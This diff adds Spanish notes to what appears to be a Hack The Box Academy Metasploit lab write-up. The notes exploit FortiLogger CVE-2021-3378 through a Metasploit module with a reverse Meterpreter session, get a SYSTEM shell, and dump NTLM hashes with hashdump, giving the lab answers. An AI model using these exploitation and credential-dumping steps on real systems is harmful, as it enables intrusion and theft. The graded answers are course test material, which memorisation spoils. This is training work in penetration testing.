@@ -347,3 +347,69 @@ Ya podemos sacarle el jugo completo a meterpreter:
 	- exponen secretos guardados por el servicio LSA (Local Security Authority), que pueden incluir credenciales, claves de servicio y secretos de dominio. Revelar esos datos permite pivotar y escalar privilegios.
 
 
+---
+**1. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?**
+
+Haciendo un escaneo básico en nmap, observo que existe un servicio http corriendo en el puerto 5000:
+```
+5000/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS
+|_http-server-header: Microsoft-IIS/10.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Al entrar mediante firefox a este servicio, me encuentro una página web con un formulario de Login firmado por "FORTILOGGER".
+Buscando en internet "fortilogger cve" me encuentro que existe la vulnerabilidad *CVE-2021-3378*.
+
+Pues, me abro una consola *msfconsole* y ejecuto:
+```
+search 2021-3378
+```
+
+Me encuentra un módulo del tipo exploit que puedo utilizar, llamado:
+>*exploit(windows/http/fortilogger_arbitrary_fileupload)*
+
+Entonces, ejecuto:
+```
+RHOST 10.129.225.42
+LHOST 10.10.14.232   (consultado mediante el comando "ip a")
+run
+```
+
+Esto nos devuelve una sesión de meterpreter.
+Ejecuto un
+```
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 8992 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+```
+
+Y me devuelve que el nombre del usuario en el que aterrizo con dicha shell es: 
+Respuesta: *nt authority\system*
+
+**2. Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.**
+
+Ejecutando desde dicha sesión de meterpreter un
+
+```
+(Meterpreter 1)(C:\Windows\system32) > hashdump
+```
+
+Obtengo estas cadenas de texto:
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+```
+
+Siendo la respuesta del ejercicio el Hash: *cf3a5525ee9414229e66279623ed5c58*
+
